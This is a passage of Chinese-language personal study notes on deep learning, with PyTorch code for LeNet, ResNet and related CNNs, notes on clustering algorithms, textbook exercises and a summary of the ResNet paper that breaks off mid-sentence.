class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">from</span> d2l <span class="keyword">import</span> torch <span class="keyword">as</span> d2l</span><br><span class="line"></span><br><span class="line">net = nn.Sequential(</span><br><span class="line">    nn.Conv2d(<span class="number">1</span>, <span class="number">6</span>, kernel_size=<span class="number">5</span>, padding=<span class="number">2</span>), nn.Sigmoid(), <span class="comment">#输入1 ，6通道，核函数5*5，填充2 ，得到的还是28*28</span></span><br><span class="line">    nn.AvgPool2d(kernel_size=<span class="number">2</span>, stride=<span class="number">2</span>), <span class="comment">#平均池化，2*2 步幅是2，得到的是 14*14</span></span><br><span class="line">    nn.Conv2d(<span class="number">6</span>, <span class="number">16</span>, kernel_size=<span class="number">5</span>), nn.Sigmoid(), <span class="comment">#输入6 ，16通道，核函数5*5，得到10*10</span></span><br><span class="line">    nn.AvgPool2d(kernel_size=<span class="number">2</span>, stride=<span class="number">2</span>), <span class="comment">#平均池化，2*2 步幅是2得到5*5</span></span><br><span class="line">    nn.Flatten(), <span class="comment">#展开，得到的是16个通道*5*5矩阵=16*5*5个元素</span></span><br><span class="line">    nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">120</span>), nn.Sigmoid(), <span class="comment">#全连接层，16*5*5个元素输入</span></span><br><span class="line">    nn.Linear(<span class="number">120</span>, <span class="number">84</span>), nn.Sigmoid(), <span class="comment">#全连接层</span></span><br><span class="line">    nn.Linear(<span class="number">84</span>, <span class="number">10</span>)) <span class="comment">#全连接层</span></span><br></pre></td></tr></table></figure><p>其训练代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">evaluate_accuracy_gpu</span>(<span class="params">net, data_iter, device=None</span>):</span> <span class="comment">#@save</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用GPU计算模型在数据集上的精度&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(net, nn.Module):</span><br><span class="line">        net.eval()  <span class="comment"># 设置为评估模式</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> device:</span><br><span class="line">            device = next(iter(net.parameters())).device</span><br><span class="line">    <span class="comment"># 正确预测的数量，总预测的数量</span></span><br><span class="line">    metric = d2l.Accumulator(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        <span class="keyword">for</span> X, y <span class="keyword">in</span> data_iter:</span><br><span class="line">            <span class="keyword">if</span> isinstance(X, list):</span><br><span class="line">                X = [x.to(device) <span class="keyword">for</span> x <span class="keyword">in</span> X]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                X = X.to(device)</span><br><span class="line">            y = y.to(device)</span><br><span class="line">            metric.add(d2l.accuracy(net(X), y), y.numel())</span><br><span class="line">    <span class="keyword">return</span> metric[<span class="number">0</span>] / metric[<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train_ch6</span>(<span class="params">net, train_iter, test_iter, num_epochs, lr, device</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;用GPU训练模型&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_weights</span>(<span class="params">m</span>):</span></span><br><span class="line">        <span class="keyword">if</span> type(m) == nn.Linear <span class="keyword">or</span> type(m) == nn.Conv2d:</span><br><span class="line">            nn.init.xavier_uniform_(m.weight)</span><br><span class="line">    net.apply(init_weights) <span class="comment">#初始化参数</span></span><br><span class="line">    print(<span class="string">&#x27;training on&#x27;</span>, device)</span><br><span class="line">    net.to(device) <span class="comment">#绑定GPU</span></span><br><span class="line">    optimizer = torch.optim.SGD(net.parameters(), lr=lr)</span><br><span class="line">    loss = nn.CrossEntropyLoss()</span><br><span class="line">    animator = d2l.Animator(xlabel=<span class="string">&#x27;epoch&#x27;</span>, xlim=[<span class="number">1</span>, num_epochs],</span><br><span class="line">                            legend=[<span class="string">&#x27;train loss&#x27;</span>, <span class="string">&#x27;train acc&#x27;</span>, <span class="string">&#x27;test acc&#x27;</span>])</span><br><span class="line">    timer, num_batches = d2l.Timer(), len(train_iter)</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> range(num_epochs):</span><br><span class="line">        <span class="comment"># 训练损失之和，训练准确率之和，样本数</span></span><br><span class="line">        metric = d2l.Accumulator(<span class="number">3</span>)</span><br><span class="line">        net.train()</span><br><span class="line">        <span class="keyword">for</span> i, (X, y) <span class="keyword">in</span> enumerate(train_iter):</span><br><span class="line">            timer.start()</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            X, y = X.to(device), y.to(device)</span><br><span class="line">            y_hat = net(X)</span><br><span class="line">            l = loss(y_hat, y) <span class="comment">#计算损失</span></span><br><span class="line">            l.backward() <span class="comment">#传播</span></span><br><span class="line">            optimizer.step() <span class="comment">#更新参数</span></span><br><span class="line">            <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">                metric.add(l * X.shape[<span class="number">0</span>], d2l.accuracy(y_hat, y), X.shape[<span class="number">0</span>])</span><br><span class="line">            timer.stop()</span><br><span class="line">            train_l = metric[<span class="number">0</span>] / metric[<span class="number">2</span>]</span><br><span class="line">            train_acc = metric[<span class="number">1</span>] / metric[<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">if</span> (i + <span class="number">1</span>) % (num_batches // <span class="number">5</span>) == <span class="number">0</span> <span class="keyword">or</span> i == num_batches - <span class="number">1</span>:</span><br><span class="line">                animator.add(epoch + (i + <span class="number">1</span>) / num_batches,</span><br><span class="line">                             (train_l, train_acc, <span class="literal">None</span>))</span><br><span class="line">        test_acc = evaluate_accuracy_gpu(net, test_iter)</span><br><span class="line">        animator.add(epoch + <span class="number">1</span>, (<span class="literal">None</span>, <span class="literal">None</span>, test_acc))</span><br><span class="line">    print(<span class="string">f&#x27;loss <span class="subst">&#123;train_l:<span class="number">.3</span>f&#125;</span>, train acc <span class="subst">&#123;train_acc:<span class="number">.3</span>f&#125;</span>, &#x27;</span></span><br><span class="line">          <span class="string">f&#x27;test acc <span class="subst">&#123;test_acc:<span class="number">.3</span>f&#125;</span>&#x27;</span>)</span><br><span class="line">    print(<span class="string">f&#x27;<span class="subst">&#123;metric[<span class="number">2</span>] * num_epochs / timer.sum():<span class="number">.1</span>f&#125;</span> examples/sec &#x27;</span></span><br><span class="line">          <span class="string">f&#x27;on <span class="subst">&#123;str(device)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Modern-CNN"><a href="#Modern-CNN" class="headerlink" title="Modern CNN"></a>Modern CNN</h2><h3 id="AlexNet"><a href="#AlexNet" class="headerlink" title="AlexNet"></a>AlexNet</h3><p><img src="https://s2.loli.net/2024/08/13/JuCOwar8iDV7ZgU.png" alt="image-20240813155854708"></p><p>网络的整体结构如上图所示。从左到右依次是输入层，五个卷积层(C1-C5),两个全连接层和一个输出层。</p><p>论文中提到由于AlexNet比较复杂，参数量很大，而加上当时硬件资源限制，所以不太好在一块GPU上进行训练，而是采用两路GPU进行并行训练。</p><p>输入层的大小是 224*224*3(实际的图像尺寸似乎是227*227*3?)。</p><p>从左到右依次介绍各个卷积层的构成。</p><p>最左边那个卷积层C1处理流程是 <code>卷积 -&gt;ReLu -&gt;局部相应归一化(LRN) -&gt;池化</code></p><p>卷积核是11*11*3,有96个，padding=0，stride=4，得到输出的窗口大小是 (227+2<em>0-11)/4+1 = 55,所以输出是55\</em>55*96（在图中其实是分成了两半，原因前文说过，采用了两路GPU并行训练)</p><p>ReLu就是将输出的FeatureMap输入到ReLu函数中</p><p>局部相应归一化的公式如下</p><script type="math/tex; mode=display">b_{x,y} ^i = a_{x,y} ^i /(k+\alpha \sum_{j = max(0,i-\frac{n}{2})}^{min(N-1,i+\frac{n}{2})} (a_{x,y})^2)^\beta</script><p>局部响应归一化层简称LRN，是在深度学习中提高准确度的技术方法。一般是在激活、池化后进行。LRN对局部神经元的活动创建竞争机制，使得其中响应比较大的值变得相对更大，并抑制其他反馈较小的神经元(其实式子分母有点类似L_p范数，这样其中较大的值影响就会比较大)，增强了模型的泛化能力。a为归一化之前的神经元，b为归一化之后的神经元；N是卷积核的个数，也就是生成的FeatureMap的个数；k，α，β，n是超参数，论文中使用的值是k=2，n=5，α=0.0001，β=0.75。</p><p>池化采用了3*3，stride=2的池化单元进行最大池化操作，得到输出是 (55+2<em>0-3)/2 +1=27,这样96个通道分为一半之后48个，每组就是27\</em>27*48</p><p>其余卷积层同理也是采用相似的方式进行搭配。我们看全连接层</p><p>最左边那个全连接层FC6,其流程为全连接-&gt;ReLU-&gt;Dropout.</p><p>全连接的输入是6*6*256,使用 4096个6*6*256的卷积核进行卷积，得到(input_size + 2 <em> padding - kernel_size) / stride + 1=(6+2</em>0-6)/1+1=1也就是1*1*4096个神经元，其运算结果通过ReLU激活函数中。</p><p>同时该层为了防止过拟合，采取了Dropout的方法，在前文也提到过，随机断开全连接层某些神经元的连接，不激活某些神经元。</p><p>FC7同理。</p><p>输出层流程:全连接-&gt;softmax</p><p>全连接输入是4096个神经元，输出1000个神经元，对应1000个检测类别。而后运算结果通过softmax函数，输出1000个类别对应预测概率</p><p>可以估算总需要的参数数量，其方法如下:</p><p>对于卷积层，计算卷积核的参数数量(需要加上偏置参数)，对于全连接层，计算神经元乘以每个神经元的参数数量(还有偏置参数)</p><h2 id="VGG"><a href="#VGG" class="headerlink" title="VGG"></a>VGG</h2><p>个人感觉VGG的主要特点就是卷积层的叠加，形成VGG块。其与AlexNet对比如下</p><p><img src="https://s2.loli.net/2024/08/13/DbWBUXFZr6ujVIL.png" alt="image-20240813172237380"></p><h2 id="ResNet"><a href="#ResNet" class="headerlink" title="ResNet"></a>ResNet</h2><p>残差神经网络(ResNet)属于深度学习模型的一种，其核心在于让网络的每一层不直接学习预期输出，而是学习与输入之间的残差关系。</p><p>其详细解析见<code>论文阅读</code>模块。因为在看相关文章的时候感觉大部分都是讲了how 和 what，而并没有讲why，也没有详细的数学证明，感觉很难受，所以还是去看了原论文看看有没有详细解释。</p><p>其基本原理是利用了一个叫做<code>残差块</code>的子网络。并且通过叠加残差块形成深度残差网络。</p><p><img src="https://s2.loli.net/2024/08/16/L6Wkmn21KxTBNEX.png" alt="image-20240816094800992"></p><p>其思想是，假设我们在一个多层神经网络模型中，有一个子网络，其函数用$H(x)$来表示，$x$是子网络的输出。而残差学习目的是调整这个子网络的参数，使其表达残差函数$F(x) = H(x)-x$。这样可以通过添加一个恒等映射的跳跃连接(叫做残差连接)，然后训练得到。</p><p>原始的ResNet研究中的残差块结构如图所示，其包含了两个3*3的卷积层和一个残差连接(其实是沿用了VGG的3*3卷积层设计)。因为串联了两个3*3的卷积层，所以就要求这2个卷积层的输入和输出形状一样，使得其可以相加。</p><p><img src="https://s2.loli.net/2024/08/16/DPntOV9W4pwime3.png" alt="image-20240816095317329"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">from</span> torch.nn <span class="keyword">import</span> functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> d2l <span class="keyword">import</span> torch <span class="keyword">as</span> d2l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Residual</span>(<span class="params">nn.Module</span>):</span>  <span class="comment">#@save</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, input_channels, num_channels,</span></span></span><br><span class="line"><span class="function"><span class="params">                 use_1x1conv=False, strides=<span class="number">1</span></span>):</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(input_channels, num_channels,</span><br><span class="line">                               kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>, stride=strides) <span class="comment">#卷积块1</span></span><br><span class="line">        <span class="comment">#kernel_size=3,padding = 1,strides=1使得output_size=(input_size+2*1-3)/1 +1 = input_size</span></span><br><span class="line">        self.conv2 = nn.Conv2d(num_channels, num_channels,</span><br><span class="line">                               kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>) <span class="comment">#卷积块2 </span></span><br><span class="line">        <span class="keyword">if</span> use_1x1conv:</span><br><span class="line">            self.conv3 = nn.Conv2d(input_channels, num_channels,</span><br><span class="line">                                   kernel_size=<span class="number">1</span>, stride=strides)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.conv3 = <span class="literal">None</span></span><br><span class="line">        self.bn1 = nn.BatchNorm2d(num_channels)归一化处理</span><br><span class="line">        self.bn2 = nn.BatchNorm2d(num_channels)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, X</span>):</span></span><br><span class="line">        Y = F.relu(self.bn1(self.conv1(X)))</span><br><span class="line">        Y = self.bn2(self.conv2(Y))</span><br><span class="line">        <span class="keyword">if</span> self.conv3:</span><br><span class="line">            X = self.conv3(X)</span><br><span class="line">        Y += X <span class="comment">#残差连接</span></span><br><span class="line">        <span class="keyword">return</span> F.relu(Y)</span><br></pre></td></tr></table></figure><p>残差块的实现如上所示。</p><p>ResNet的前两层和GoogLeNet一样，首先是输出通道数为64，步幅为2的7*7卷积层，然后是步幅为2的3*3最大汇聚层。但是ResNet在卷积层后添加了批量规范化层</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b1 = nn.Sequential(nn.Conv2d(<span class="number">1</span>, <span class="number">64</span>, kernel_size=<span class="number">7</span>, stride=<span class="number">2</span>, padding=<span class="number">3</span>),</span><br><span class="line">                   nn.BatchNorm2d(<span class="number">64</span>), nn.ReLU(),</span><br><span class="line">                   nn.MaxPool2d(kernel_size=<span class="number">3</span>, stride=<span class="number">2</span>, padding=<span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>接下来ResNet使用了4个由残差块组成的模块。</p><p>第一个模块的输出通道数和输入通道数一致</p><p>之后的每个模块在第一个残差块中将上一个模块的通道数翻倍，同时高和宽减半.</p><p>最后加入全局平均汇聚层，以及全连接输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resnet_block</span>(<span class="params">input_channels, num_channels, num_residuals,</span></span></span><br><span class="line"><span class="function"><span class="params">                 first_block=False</span>):</span></span><br><span class="line">    blk = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num_residuals):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span> <span class="keyword">and</span> <span class="keyword">not</span> first_block:</span><br><span class="line">            blk.append(Residual(input_channels, num_channels,</span><br><span class="line">                                use_1x1conv=<span class="literal">True</span>, strides=<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            blk.append(Residual(num_channels, num_channels))</span><br><span class="line">    <span class="keyword">return</span> blk</span><br><span class="line">b2 = nn.Sequential(*resnet_block(<span class="number">64</span>, <span class="number">64</span>, <span class="number">2</span>, first_block=<span class="literal">True</span>))</span><br><span class="line">b3 = nn.Sequential(*resnet_block(<span class="number">64</span>, <span class="number">128</span>, <span class="number">2</span>))</span><br><span class="line">b4 = nn.Sequential(*resnet_block(<span class="number">128</span>, <span class="number">256</span>, <span class="number">2</span>))</span><br><span class="line">b5 = nn.Sequential(*resnet_block(<span class="number">256</span>, <span class="number">512</span>, <span class="number">2</span>))</span><br><span class="line">net = nn.Sequential(b1, b2, b3, b4, b5,</span><br><span class="line">                    nn.AdaptiveAvgPool2d((<span class="number">1</span>,<span class="number">1</span>)),</span><br><span class="line">                    nn.Flatten(), nn.Linear(<span class="number">512</span>, <span class="number">10</span>))</span><br></pre></td></tr></table></figure><h2 id="Trainsfromer"><a href="#Trainsfromer" class="headerlink" title="Trainsfromer"></a>Trainsfromer</h2><h2 id="一些聚类算法"><a href="#一些聚类算法" class="headerlink" title="一些聚类算法"></a>一些聚类算法</h2><p>简单来说聚类就是将样本集$D = \{\mathbf{x_1} \dots,\mathbf{x_m} \}$ 划分成$k$个不相交的簇$\{C_l | l = 1,2,\dots,k\}$ ,两两不相交，所有并集结果为样本集。</p><p>我们希望得到的划分使得簇内相似性高，簇间相似性低。其性能度量分为两类，一种是将聚类结果与某个“参考模型”比较，称为外部指标。还有一种就是不利用任何参考模型，称为“内部指标”</p><p>对于有参考模型$C^<em> = \{C_1^</em>,C_2^<em>,\dots,C_s^</em>\}$的，我们可以对样本中的某个样本对$\mathbf{x_i},\mathbf{x_j}$，根据我们算法得到的聚类结果$C$以及参考模型$C^*$得到的结果分类分为四种情况:</p><ul><li>二者在$C$和$C^*$都归为一类，其结果总数记为$a$</li><li>二者在$C$中归为一类，$C^*$中不归为一类，其结果总数记为$b$</li><li>二者在$C^*$中归为一类，$C$中不归为一类，其结果总数记为$c$</li><li>二者在$C$和$C^*$都不归为一类，其结果总数记为$d$</li></ul><p>显然有$a+b+c+d = \frac{m(m-1)}{2}$</p><p>有如下指数进行衡量</p><ul><li>Jaccard指数</li></ul><script type="math/tex; mode=display">JC = \frac{a}{a+b+c}</script><ul><li>FM指数</li></ul><script type="math/tex; mode=display">FMI = \sqrt{\frac{a}{a+b}\frac{a}{a+c}}</script><ul><li>RAND指数</li></ul><script type="math/tex; mode=display">RI = \frac{2*(a+d)}{m(m-1)}</script><p>上述指标在$[ 0,1]$区间，并且值越大越好。</p><p>对于簇划分结果$C = \{C_1,C_2,\dots,C_k\}$ 有</p><script type="math/tex; mode=display">avg(C) = \frac{2}{|C|(|C|-1)} \sum_{1\leq i\leq j \leq |C|} dist(\mathbf{x_i},\mathbf{x_j}) \\diam(C) = max_{1\leq i\leq j \leq |C|} dist(\mathbf{x_i},\mathbf{x_j}) \\d_{min}(C_i,C_j) = min_{\mathbf{x_i} \in C_i,\mathbf{x_j} \in C_j} dist(\mathbf{x_i},\mathbf{x_j}) \\d_{cen}(C_i,C_j) = dist(\mathbf{\mu}_i,\mathbf{\mu}_j)</script><p>$dist(<em>,</em>)$用于计算样本间距离，$\mathbf{\mu}$ 代表簇中心点 $\mathbf{\mu} = \frac{1}{|C|} \sum_{1\leq i\leq |C|} \mathbf{x}_i$ 。</p><p>$avg(C)$代表簇$C$内样本平均距离</p><p>$diam(C)$代表簇$C$内样本最远距离</p><p>$d_{min}(C_i,C_j)$代表簇$C_i,C_j$的最近样本间距离</p><p>$d_{cen}(C_i,C_j)$代表簇$C_i,C_j$的中心点间距离</p><p>$dist(<em>,</em>)$常用的是<code>闵可夫斯基距离</code>  (其实就是Lp范数)</p><script type="math/tex; mode=display">dist_{mk}(\mathbf{x_i},\mathbf{x_j}) = \sqrt[p]{(\sum_{u=1} ^{n} |x_{iu}-x_{ju}| ^p)}</script><p>$p=2$时代表了欧几里得距离，$p=1$代表了曼哈顿距离。</p><h3 id="k-means算法"><a href="#k-means算法" class="headerlink" title="k-means算法"></a>k-means算法</h3><p>给定样本集$D = \{\mathbf{x_1} \dots,\mathbf{x_m} \}$,k-means算法针对聚类得到的簇划分$C = \{C_1,C_2,\dots,C_k\}$,最小化平方误差</p><script type="math/tex; mode=display">E = \sum_{i=1} ^{k} \sum_{\mathbf{x} \in C_i} ||\mathbf{x}-\mathbf{\mu}_i||_2^2</script><p>简单来说就是最小化每个簇离其簇中心点的距离的和。</p><p>它很难最小化，是一个NP问题。K-means使用的是贪心策略，其算法如下所示。</p><p><img src="https://s2.loli.net/2024/08/17/CjZz2vSiaQoPRJm.png" alt="image-20240817164750691"></p><p>挺好理解的，就是首先初始化均值向量，然后对每个向量考察每个簇不断挑选离其最近的划入，然后更新均值向量，重复此过程。</p><p>但是个人感觉这种方法的准确率有点取决于初始化的那些初始化的均值向量的优劣？</p><h3 id="学习向量化-LVQ"><a href="#学习向量化-LVQ" class="headerlink" title="学习向量化(LVQ)"></a>学习向量化(LVQ)</h3><p>LVQ假设数据样本带有类别标记</p><p>对于样本集$D = \{(\mathbf{x_1},y_1),\dots,(\mathbf{x_m},y_m)\}$ ，,$\mathbf{x_i}$ 由$n$ 个属性描述，$y_i \in \mathcal{Y}$</p><p>LVQ的目标是学得一组$n$维原型向量$\{ \mathbf{p}_1,\mathbf{p}_2,\dots,\mathbf{p}_q\}$,每个原型向量代表一个聚类簇，簇标记$t_i \in \mathcal{Y}$</p><p>其算法如下</p><p><img src="https://s2.loli.net/2024/08/17/cbvFBxeA3UuE6lZ.png" alt="image-20240817172355331"></p><p>主要关键是6-10行，如果原型向量与挑选样本标记相同，则靠拢，否则远离。</p><h2 id="RNN"><a href="#RNN" class="headerlink" title="RNN"></a>RNN</h2><p>引入是为了解决对序列信息的预测</p><script type="math/tex; mode=display">x_t \sim P(x_t|x_{t-1},\dots,x_1)</script><p>对其有几种策略，一种是追求一定程度上的局部性，即认为只有最近的$\tau$个序列($x_{t-1},\dots,x_{t-\tau}(t&gt;\tau)$)是有用的。这种称为自回归模型</p><p>还有一种是保留对过去的所有总结$h_t$,并更新预测$\hat{x_t}$和总结$h_t$。$h_t$相当于对过往信息的一种汇总吧.即基于以下两个递推式。这种称为隐变量自回归模型。</p><script type="math/tex; mode=display">\hat{x_t} = P(x_t|h_t)\\ h_t = g(h_{t-1},x_{t-1})</script><p>示意图如下</p><p><img src="C:\Users\YPJ\AppData\Roaming\Typora\typora-user-images\image-20240820161605107.png" alt="image-20240820161605107"></p><h1 id="西瓜书课后题选做"><a href="#西瓜书课后题选做" class="headerlink" title="西瓜书课后题选做"></a>西瓜书课后题选做</h1><p>并没有全部都做，这里挑了一些觉得有意思的题做了记录一下，主要是一些数学推导相关的题，因为比较直观。读的时候感觉这本书涉及到一些凸优化的东西，因为笔者对数学还是很感兴趣的，以后有空了可以再深入了解一下。</p><h2 id="一、绪论"><a href="#一、绪论" class="headerlink" title="一、绪论"></a>一、绪论</h2><p>1.4 题意是将其他性能度量取代”分类错误率”进行证明”没有免费的午餐定理”仍然成立</p><p>即将</p><script type="math/tex; mode=display">E_{ote}(\mathcal L_a| X,f) = \sum_h\sum_{\mathbf{x} \in{\chi-X}} P(\mathbf{x}) \mathbb I(h(\mathbf{x}) \neq f(\mathbf{x}))P(h|X,\mathcal L_a)</script><p>中的指示函数$\mathbb I(*)$ 替换,证明方法类似，对于所有可能的均匀分布$f$求和。原先这里使用的是指示函数。对于二分类的话只要$\ell(h(\mathbf{x}) = f(\mathbf{x})) +\ell(h(\mathbf{x}) \neq f(\mathbf{x}))$仍为常数，我们仍然能对其进行展开</p><script type="math/tex; mode=display">\sum_f E_{ote}(\mathcal L_a| X,f) = \sum_f\sum_h\sum_{\mathbf{x} \in{\chi-X}} P(\mathbf{x}) \ell(h(\mathbf{x}) , f(\mathbf{x}))P(h|X,\mathcal L_a) \\=  \sum_{\mathbf{x} \in{\chi-X}} P(\mathbf{x})\sum_{h}P(h|X,\mathcal L_a) \sum_f\ell(h(\mathbf{x}) , f(\mathbf{x})) \\=\sum_{\mathbf{x} \in{\chi-X}} P(\mathbf{x})\sum_{h}P(h|X,\mathcal L_a)*2^{|\chi|-1}*A\\=2^{|\chi|-1}*A*\sum_{\mathbf{x} \in{\chi-X}}P(\mathbf{x})</script><p>仍然与学习算法$\mathcal L_a$无关</p><h1 id="论文阅读"><a href="#论文阅读" class="headerlink" title="论文阅读"></a>论文阅读</h1><h2 id="Deep-Residual-Learning-for-Image-Recognition"><a href="#Deep-Residual-Learning-for-Image-Recognition" class="headerlink" title="Deep Residual Learning for Image Recognition"></a>Deep Residual Learning for Image Recognition</h2><p>深度残差网络的论文。</p><p>作者在Introduction中提到在深层神经网络中，当网络开始收敛的时候会有退化问题：当网络层数增加的时候准确性趋于饱和(显然的增加层数可以一定程度提升准确性)，但是之后会迅速下降。作者提到这种问题并不是过拟合导致的。往一个合适的深度学习模型添加更多的层会引入更高的训练误差，如这个表格所示。作者统计对比了20层和56层的网络的训练误差和测试误差，均是56层的比较高。</p><p><img src="https://s2.loli.net/2024/08/16/qycCjJf1Q4XteLD.png" alt="image-20240816151416535"></p><p>作者认为这种退化表明并不是所有的系统都容易优化。作者构想了这样一个对比:假如有两个具有相同结构的深度学习模型A和B，他们前半部分完全一样，但是B相较于A在后面添加了一些恒等映射的层(相当于B只比A多加了这些恒等映射的层，其他均一致)。理论上来说，B不应该比A表现出更高的训练误差。但是实验显示我们现在使用的解决办法无法找到一个和这个构想的solution同等或更好的solution。</p><p>所以作者在论文中便是为了解决这个退化问题，引入了深度残差网络的框架。与其让这些层直接地去拟合一个潜在的映射，不如去让他们你和一个残差映射。用数学语言描述就是，原本这些layer拟合一个函数$H(\mathbf x)$,现在我们让其去拟合$F(\mathbf{x}) = H(\mathbf x)-\mathbf x$。这样原来的映射就相当于去拟合了$F(\mathbf{x}) +\mathbf{x}$ 。作者假定去拟合这样的残差映射比拟合原本的映射要更好优化。极端地来说，如果我们需要拟合的是一个恒等映射，那么这些非线性层拟合全零肯定比拟合恒等映射要容易很多。作者在ImageNet上取得了非常好的成效，并且是在ImageNet上面最深的神经网络。</p><p><img src="https://s2.loli.net/2024/08/16/S4iI8KzZFM9hEaN.png" alt=" "></p><p>作者认为，如果多个非线性层能很好地渐进拟合$H(\mathbf{x})$,那么它同样也能很好地去渐进拟合$H(\mathbf{x}) -\mathbf{x}$ 。所以与其期望叠加层数来拟合$H(\mathbf{x})$,不如让其去你和一个残差函数$F(\mathbf{x}) =H(\mathbf{x})-\mathbf{x}$ ,这样原函数就变成了$F(\mathbf{x}) +\mathbf{x}$ ,虽然两者都能渐进地估计所需的函数，但是二者的训练难度是不同的。</p><p>作者将残差块数学描述为</p><script type="math/tex; mode=display">\mathbf{y} = F(\mathbf{x},\{\mathbf{W_i}\}) +\mathbf{x}</script><p>其中$\mathbf{x},\mathbf{y}$分别代表了这些层的输入和输出向量。函数$F(\mathbf{x},\{\mathbf{W_i}\})$表示需要学习的残差映射。在Figure2中就是$F = W_2\sigma(W_1\mathbf{x})$ ,其中$\sigma$代表了ReLU函数。其中$F$和$\mathbf{x}$的维度需要向等，不然就要添加一个线性投影$W_s$</p><script type="math/tex; mode=display">\mathbf{y} = F(\mathbf{x},\{\mathbf{W_i}\}) +W_s\mathbf{x}</script><p>同时作者提到了$F$最好包括两到三层，更多层也是可以的。但是如果只有一层的话将会退化成$\mathbf{y} = W_1\mathbf{x}+\mathbf{x}$,将没有明显的优势。</p><p>作者描述了两种模型。一种是Plain Network(个人理解就是普通的CNN)。它主要是作为基准与残差网络进行对比。它主要是使用了VGG网络的想法。每层卷积层有3*3的卷积核。并遵循两个规则:1对于相同的输出特征图的size，layers有相同数量的fliters，并且2如果特征图的size减半，那么fliters的数量就翻倍，以保持每层的时间复杂度。这个模型比VGG网络复杂性要低很多，大概有 3.6 billion FLOPs，只有VGG-19的18%。</p><p>还有一种就是作者构想的Residual Network即残差网络。与plain Network不同的是添加了一些残差连接。当输入和输出维度相同的时候，identity 